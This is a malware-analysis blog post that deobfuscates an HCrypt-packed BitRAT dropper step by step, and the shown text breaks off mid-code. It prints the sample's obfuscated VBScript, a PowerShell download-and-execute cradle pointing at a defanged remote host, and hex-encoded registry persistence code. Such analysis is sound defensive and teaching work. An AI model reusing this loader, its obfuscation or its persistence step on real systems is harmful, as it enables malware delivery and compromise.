<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HCrypt Injecting BitRAT using PowerShell, HTAs, and .NET" /><meta property="og:locale" content="en" /><meta name="description" content="One of my colleagues made a statement recently about how commonplace process injection has become among malware, to the point where it seems adversaries don’t have to think about the injection techniques anymore. This is absolutely true as many adversaries deploying malware have begun using crypters like HCrypt or Snip3 that inject their arbitrary payloads into other arbitrary processes. In this post I’m going to walk though analyzing a malware payload protected using HCrypt and injected into aspnet_compiler.exe. If you want to play along at home, the sample is available in MalwareBazaar here: https://bazaar.abuse.ch/sample/f30cba9be2a7cf581939e7e7b958d5e0554265a685b3473947bf2c26679995d3/" /><meta property="og:description" content="One of my colleagues made a statement recently about how commonplace process injection has become among malware, to the point where it seems adversaries don’t have to think about the injection techniques anymore. This is absolutely true as many adversaries deploying malware have begun using crypters like HCrypt or Snip3 that inject their arbitrary payloads into other arbitrary processes. In this post I’m going to walk though analyzing a malware payload protected using HCrypt and injected into aspnet_compiler.exe. If you want to play along at home, the sample is available in MalwareBazaar here: https://bazaar.abuse.ch/sample/f30cba9be2a7cf581939e7e7b958d5e0554265a685b3473947bf2c26679995d3/" /><link rel="canonical" href="https://forensicitguy.github.io/hcrypt-injecting-bitrat-analysis/" /><meta property="og:url" content="https://forensicitguy.github.io/hcrypt-injecting-bitrat-analysis/" /><meta property="og:site_name" content="Tony Lambert" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-01-23T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HCrypt Injecting BitRAT using PowerShell, HTAs, and .NET" /><meta name="twitter:site" content="@ForensicITGuy" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-03-28T23:09:20+00:00","datePublished":"2022-01-23T00:00:00+00:00","description":"One of my colleagues made a statement recently about how commonplace process injection has become among malware, to the point where it seems adversaries don’t have to think about the injection techniques anymore. This is absolutely true as many adversaries deploying malware have begun using crypters like HCrypt or Snip3 that inject their arbitrary payloads into other arbitrary processes. In this post I’m going to walk though analyzing a malware payload protected using HCrypt and injected into aspnet_compiler.exe. If you want to play along at home, the sample is available in MalwareBazaar here: https://bazaar.abuse.ch/sample/f30cba9be2a7cf581939e7e7b958d5e0554265a685b3473947bf2c26679995d3/","headline":"HCrypt Injecting BitRAT using PowerShell, HTAs, and .NET","mainEntityOfPage":{"@type":"WebPage","@id":"https://forensicitguy.github.io/hcrypt-injecting-bitrat-analysis/"},"url":"https://forensicitguy.github.io/hcrypt-injecting-bitrat-analysis/"}</script><title>HCrypt Injecting BitRAT using PowerShell, HTAs, and .NET | Tony Lambert</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tony Lambert"><meta name="application-name" content="Tony Lambert"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/images/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Tony Lambert</a></div><div class="site-subtitle font-italic">An educator that does security things</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/ForensicITGuy" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/ForensicITGuy" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://ko-fi.com/forensicitguy" aria-label="ko-fi" target="_blank" rel="noopener"> <i class="fas fa-mug-hot"></i> </a> <a href="https://infosec.exchange/web/@ForensicITGuy" aria-label="mastodon" target="_blank" rel="noopener"> <i class="fab fa-mastodon"></i> </a> <a href="https://www.linkedin.com/in/tonymlambert/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HCrypt Injecting BitRAT using PowerShell, HTAs, and .NET</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HCrypt Injecting BitRAT using PowerShell, HTAs, and .NET</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1642896000" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-01-23 </em> </span> <span> Updated <em class="timeago" data-ts="1648508960" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-03-28 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2759 words"> <em>15 min</em> read</span></div></div></div><div class="post-content"><p>One of my colleagues made a statement recently about how commonplace process injection has become among malware, to the point where it seems adversaries don’t have to think about the injection techniques anymore. This is absolutely true as many adversaries deploying malware have begun using crypters like HCrypt or Snip3 that inject their arbitrary payloads into other arbitrary processes. In this post I’m going to walk though analyzing a malware payload protected using HCrypt and injected into <code class="language-plaintext highlighter-rouge">aspnet_compiler.exe</code>. If you want to play along at home, the sample is available in MalwareBazaar here: <a href="https://bazaar.abuse.ch/sample/f30cba9be2a7cf581939e7e7b958d5e0554265a685b3473947bf2c26679995d3/">https://bazaar.abuse.ch/sample/f30cba9be2a7cf581939e7e7b958d5e0554265a685b3473947bf2c26679995d3/</a></p><h2 id="wait-isnt-injection-complicated"><span class="mr-2">Wait, Isn’t Injection Complicated??</span><a href="#wait-isnt-injection-complicated" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Eh, process injection can be extremely technical and complicated depending on how deeply you want to understand process internals. If you’re simply looking to use process injection, there are multiple free and paid tools that will help you inject an arbitrary array of bytes into an arbitrary process’s memory. In some of the paid products, all an adversary needs to do is check a box. In the case of free tools, sometimes a little bit of coding is needed.</p><h2 id="triaging-ps1hta-and-decoding-stage-01"><span class="mr-2">Triaging PS1.hta and Decoding (Stage 01)</span><a href="#triaging-ps1hta-and-decoding-stage-01" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>MalwareBazaar says the sample is a HTA file, but we should still approach with caution using <code class="language-plaintext highlighter-rouge">file</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/bitrat$</span><span class="w"> </span>file PS1.hta 
<span class="go">PS1.hta: HTML document, ASCII text, with very long lines, with no line terminators

</span><span class="gp">remnux@remnux:~/cases/bitrat$</span><span class="w"> </span>xxd PS1.hta | <span class="nb">head</span>
<span class="go">00000000: 3c73 6372 6970 7420 6c61 6e67 7561 6765  &lt;script language
</span><span class="gp">00000010: 3d6a 6176 6173 6372 6970 743e 646f 6375  =javascript&gt;</span>docu
<span class="go">00000020: 6d65 6e74 2e77 7269 7465 2875 6e65 7363  ment.write(unesc
00000030: 6170 6528 2725 3343 7363 7269 7074 2532  ape('%3Cscript%2
00000040: 306c 616e 6775 6167 6525 3344 2532 3256  0language%3D%22V
00000050: 4253 6372 6970 7425 3232 2533 4525 3041  BScript%22%3E%0A
00000060: 4675 6e63 7469 6f6e 2532 3076 6172 5f66  Function%20var_f
00000070: 756e 6325 3238 2532 3925 3041 4842 2532  unc%28%29%0AHB%2
00000080: 3025 3344 2532 3072 6570 6c61 6365 2532  0%3D%20replace%2
00000090: 3825 3232 706f 7725 3238 2d5f 2d25 3239  8%22pow%28-_-%29
</span></pre></table></code></div></div><p>Alright, it looks like we have a HTA file! The <code class="language-plaintext highlighter-rouge">file</code> magic corresponded with HTML document thanks to the <code class="language-plaintext highlighter-rouge">script</code> tags on the inside. We can even sample the contents with <code class="language-plaintext highlighter-rouge">xxd | head</code> to see the strings correspond to script tags containing JavaScript. The JavaScript inside contains <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/write"><code class="language-plaintext highlighter-rouge">document.write()</code></a> and <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/unescape"><code class="language-plaintext highlighter-rouge">unescape()</code></a> function calls. This means the actual contents of the HTA file are a bit obfuscated using URL encoding and will be deobfuscated and written into an HTML document in memory at the time of rendering. To get further we need to deobfuscate the code ourselves safely.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;script </span><span class="na">language=</span><span class="s">javascript</span><span class="nt">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">unescape</span><span class="p">(</span><span class="dl">'</span><span class="s1">%3Cscript%20language%3D%22VBScript%22%3E%0AFunction%20...self.close%0A%3C/script%3E</span><span class="dl">'</span><span class="p">))</span><span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Thankfully we can use a little bit of NodeJS to deobfuscate the code ourselves! Using the little bit of code below, we can write the deobfuscated HTA content into <code class="language-plaintext highlighter-rouge">stage02.hta</code>. If you want to see this approach used more, consider making a stop by <a href="https://forensicitguy.github.io/decoding-webshell-using-nodejs/">this post</a> where I decode a web shell using the same method.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">fs</span><span class="dl">'</span><span class="p">)</span>

<span class="nx">page</span> <span class="o">=</span> <span class="nx">unescape</span><span class="p">(</span><span class="dl">'</span><span class="s1">%3Cscript%20language%3D%22VBScript%22%3E%0AFunction%20...self.close%0A%3C/script%3E</span><span class="dl">'</span><span class="p">)</span>

<span class="nx">fs</span><span class="p">.</span><span class="nx">writeFileSync</span><span class="p">(</span><span class="dl">'</span><span class="s1">stage02.hta</span><span class="dl">'</span><span class="p">,</span><span class="nx">page</span><span class="p">)</span>
</pre></table></code></div></div><h2 id="decoding-powershell-from-stage-02"><span class="mr-2">Decoding PowerShell From Stage 02</span><a href="#decoding-powershell-from-stage-02" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Now let’s dive into <code class="language-plaintext highlighter-rouge">stage02.hta</code>! The HTA contains VBScript code within the HTA script tags. There’s quite a bit of string obfuscation going on here as well. First, we can tell from looking at the <code class="language-plaintext highlighter-rouge">HB</code> variable we’re likely looking into a PowerShell command, and the URL in <code class="language-plaintext highlighter-rouge">HBB</code> already shows that the sample downloads additional content. The easy hypothesis here is that PowerShell will likely download content from this URL and execute it. To confirm/disprove the hypothesis we need to remove the string obfuscation. Part of the deobfuscation is really easy using find/replace functionality in a code editor of your choice. The last bit of obfuscation requires a bit more work with your eyes. The <code class="language-plaintext highlighter-rouge">{2}{0}{1} -f</code> chunks of PowerShell code correspond with <a href="https://devblogs.microsoft.com/scripting/understanding-powershell-and-basic-string-formatting/">PowerShell Format strings</a>. This feature lets the developer have variable “holding spots” in the middle of a string and specify the contents of the variable after the rest of the string is defined. To deobfuscate this part, just treat the strings after <code class="language-plaintext highlighter-rouge">-f</code> like an array, and join them together in the proper order.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="nt">&lt;script </span><span class="na">language=</span><span class="s">"VBScript"</span><span class="nt">&gt;</span>
<span class="nb">Function</span> <span class="nx">var_func</span><span class="p">()</span>
<span class="nx">HB</span> <span class="o">=</span> <span class="nx">replace</span><span class="p">(</span><span class="dl">"</span><span class="s2">pow(-_-)rsh(-_-)ll </span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">(-_-)</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">e</span><span class="dl">"</span><span class="p">)</span>
<span class="nx">HBB</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">$@@@x = 'hxxp://135.148.74[.]241/PS1_B.txt';$@@@$$$=('{2}{0}{1}' -f'---------l---------888---------Nguyễn Văn Tí---------d---------'Nguyễn Văn TủnR777Nguyễn Văn TèolNguyễn Văn Tí666777('---------',''),'**********+++**********t**********r**********i**********n**********g**********'Nguyễn Văn TủnR777Nguyễn Văn TèolNguyễn Văn Tí666777('**********',''),'++++++++++D++++++++++888++++++++++w++++++++++n++++++++++'Nguyễn Văn TủnR777Nguyễn Văn TèolNguyễn Văn Tí666777('++++++++++',''));$@@@$$$$$$=('{2}{0}{1}' -f'---------777---------$$$---------666---------l---------'Nguyễn Văn TủnR777Nguyễn Văn TèolNguyễn Văn Tí666777('---------',''),'---------i---------777---------n---------t---------'Nguyễn Văn TủnR777Nguyễn Văn TèolNguyễn Văn Tí666777('---------',''),'---------N777---------t---------Nguyễn Văn TủnW---------'Nguyễn Văn TủnR777Nguyễn Văn TèolNguyễn Văn Tí666777('---------',''));$@@@$$$$$$$$$=('{2}{0}{1}' -f'------w-888------$$$------j------777------666------t  $------@@@------'Nguyễn Văn TủnR777Nguyễn Văn TèolNguyễn Văn Tí666777('------',''),'------$$$$$$------)Nguyễn Văn Tủn$@@@------$$$(------$@@@------x)------'Nguyễn Văn TủnR777Nguyễn Văn TèolNguyễn Văn Tí666777('------',''),'------I------`777------`X(------N777------'Nguyễn Văn TủnR777Nguyễn Văn TèolNguyễn Văn Tí666777('------',''));$@@@$$$$$$$$$$$$$$$ = ($@@@$$$$$$$$$ -J888in '')|InV888k777-777xNguyễn Văn Tèor777++++++i888N</span><span class="dl">"</span>
<span class="nx">HBB</span> <span class="o">=</span> <span class="nx">replace</span><span class="p">(</span><span class="nx">HBB</span><span class="p">,</span><span class="dl">"</span><span class="s2">777</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">e</span><span class="dl">"</span><span class="p">)</span>
<span class="nx">HBB</span> <span class="o">=</span> <span class="nx">replace</span><span class="p">(</span><span class="nx">HBB</span><span class="p">,</span><span class="dl">"</span><span class="s2">888</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">o</span><span class="dl">"</span><span class="p">)</span>
<span class="nx">HBB</span> <span class="o">=</span> <span class="nx">replace</span><span class="p">(</span><span class="nx">HBB</span><span class="p">,</span><span class="dl">"</span><span class="s2">666</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">c</span><span class="dl">"</span><span class="p">)</span>
<span class="nx">HBB</span> <span class="o">=</span> <span class="nx">replace</span><span class="p">(</span><span class="nx">HBB</span><span class="p">,</span><span class="dl">"</span><span class="s2">+++</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">s</span><span class="dl">"</span><span class="p">)</span>
<span class="nx">HBB</span> <span class="o">=</span> <span class="nx">replace</span><span class="p">(</span><span class="nx">HBB</span><span class="p">,</span><span class="dl">"</span><span class="s2">$$$</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">B</span><span class="dl">"</span><span class="p">)</span>
<span class="nx">HBB</span> <span class="o">=</span> <span class="nx">replace</span><span class="p">(</span><span class="nx">HBB</span><span class="p">,</span><span class="dl">"</span><span class="s2">@@@</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">H</span><span class="dl">"</span><span class="p">)</span>
<span class="nx">HBB</span> <span class="o">=</span> <span class="nx">replace</span><span class="p">(</span><span class="nx">HBB</span><span class="p">,</span><span class="dl">"</span><span class="s2">Nguyễn Văn Tèo</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">P</span><span class="dl">"</span><span class="p">)</span>
<span class="nx">HBB</span> <span class="o">=</span> <span class="nx">replace</span><span class="p">(</span><span class="nx">HBB</span><span class="p">,</span><span class="dl">"</span><span class="s2">Nguyễn Văn Tí</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">a</span><span class="dl">"</span><span class="p">)</span>
<span class="nx">HBB</span> <span class="o">=</span> <span class="nx">replace</span><span class="p">(</span><span class="nx">HBB</span><span class="p">,</span><span class="dl">"</span><span class="s2">Nguyễn Văn Tủn</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">.</span><span class="dl">"</span><span class="p">)</span>
<span class="kd">set</span> <span class="nx">HBBB</span> <span class="o">=</span> <span class="nx">GetObject</span><span class="p">(</span><span class="nx">replace</span><span class="p">(</span><span class="dl">"</span><span class="s2">new:F935DC22-1CF(-_-)-11D(-_-)-ADB9-(-_-)(-_-)C(-_-)4FD58A(-_-)B</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">(-_-)</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">))</span>
<span class="nx">Execute</span><span class="p">(</span><span class="dl">"</span><span class="s2">HBBB.Run HB+HBB, 0, True</span><span class="dl">"</span><span class="p">)</span>
<span class="nx">End</span> <span class="nb">Function</span>
<span class="nx">var_func</span>
<span class="nb">self</span><span class="p">.</span><span class="nx">close</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>After distilling the PowerShell command it looks like our hypothesis is confirmed! The PowerShell command creates a <a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0"><code class="language-plaintext highlighter-rouge">Net.WebClient</code></a> object and calls <a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0"><code class="language-plaintext highlighter-rouge">DownloadString()</code></a> to retrieve additional content. Then the content is fed into <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2"><code class="language-plaintext highlighter-rouge">Invoke-Expression</code></a>. Since this cmdlet is designed to execute additional arbitrary PowerShell commands, we can assume whatever gets downloaded is also PowerShell. So let’s dig into <code class="language-plaintext highlighter-rouge">PS1_B.txt</code>!</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$Hx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'hxxp://135.148.74[.]241/PS1_B.txt'</span><span class="p">;</span><span class="w">
</span><span class="nv">$HB</span><span class="o">=</span><span class="p">(</span><span class="s1">'DownloadString'</span><span class="p">);</span><span class="w">
</span><span class="nv">$HBB</span><span class="o">=</span><span class="p">(</span><span class="s1">'Net.WebClient'</span><span class="p">);</span><span class="w">
</span><span class="nv">$HBBB</span><span class="o">=</span><span class="p">(</span><span class="s1">'IeX(New-Object $HBB).$HB($Hx)'</span><span class="p">);</span><span class="w">
</span><span class="nv">$HBBBBB</span><span class="w"> </span><span class="o">=</span><span class="p">(</span><span class="nv">$HBBB</span><span class="w"> </span><span class="o">-Join</span><span class="w"> </span><span class="s1">''</span><span class="p">)</span><span class="o">|</span><span class="n">InVoke-exPressioN</span><span class="w">
</span></pre></table></code></div></div><h2 id="decoding-ps1_btxt-powershell-stage-03"><span class="mr-2">Decoding PS1_B.txt PowerShell (Stage 03)</span><a href="#decoding-ps1_btxt-powershell-stage-03" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Fast-forwarding through the triage of this file, we can see it contains PowerShell code as expected. We can already see some low-hanging indicators in the content. <code class="language-plaintext highlighter-rouge">C:\ProgramData\3814364655181379114711\3814364655181379114711.HTA</code> is going to contain the code specified in <code class="language-plaintext highlighter-rouge">$FFF</code>. Just like the first HTA file, the content is obfuscated using URL encoding. I’m going to wager that’s part of a persistence mechanism. Again, we see a URL and <code class="language-plaintext highlighter-rouge">Invoke-Expression</code>. It’s probably a safe bet that the URL delivers more PowerShell code. There’s also a hex-encoded string that likely contains PowerShell code. After getting decoded into <code class="language-plaintext highlighter-rouge">$asciiString</code> the code gets executed with <code class="language-plaintext highlighter-rouge">iex</code>, an alias for <code class="language-plaintext highlighter-rouge">Invoke-Expression</code>. So let’s get that cleartext string.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nv">$HHxHH</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\ProgramData\3814364655181379114711"</span><span class="w">
</span><span class="nv">$HHHxHHH</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\ProgramData\3814364655181379114711"</span><span class="w">
</span><span class="nv">$hexString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"5b 73 79 73 74 65 6d 2e 69 6f 2e 64 69 72 65 63 74 6f 72 79 5d 3a 3a 43 72 65 61 74 65 44 69 72 65 63 74 6f 72 79 28 24 48 48 78 48 48 29 0a 73 74 61 72 74 2d 73 6c 65 65 70 20 2d 73 20 35 0a 53 65 74 2d 49 74 65 6d 50 72 6f 70 65 72 74 79 20 2d 50 61 74 68 20 22 48 4b 43 55 3a 5c 53 6f 66 74 77 61 72 65 5c 4d 69 63 72 6f 73 6f 66 74 5c 57 69 6e 64 6f 77 73 5c 43 75 72 72 65 6e 74 56 65 72 73 69 6f 6e 5c 45 78 70 6c 6f 72 65 72 5c 55 73 65 72 20 53 68 65 6c 6c 20 46 6f 6c 64 65 72 73 22 20 2d 4e 61 6d 65 20 22 53 74 61 72 74 75 70 22 20 2d 56 61 6c 75 65 20 24 48 48 48 78 48 48 48 3b"</span><span class="w">
</span><span class="nv">$asciiChars</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$hexString</span><span class="w"> </span><span class="o">-split</span><span class="w"> </span><span class="s1">' '</span><span class="w"> </span><span class="o">|</span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{[</span><span class="n">char</span><span class="p">][</span><span class="n">byte</span><span class="p">]</span><span class="s2">"0x</span><span class="bp">$_</span><span class="s2">"</span><span class="p">}</span><span class="w">
</span><span class="nv">$asciiString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$asciiChars</span><span class="w"> </span><span class="o">-join</span><span class="w"> </span><span class="s1">''</span><span class="w">
</span><span class="n">iex</span><span class="w"> </span><span class="nv">$asciiString</span><span class="w">
</span><span class="n">start-sleep</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nx">3</span><span class="w">
</span><span class="nv">$FFF</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sh">@'
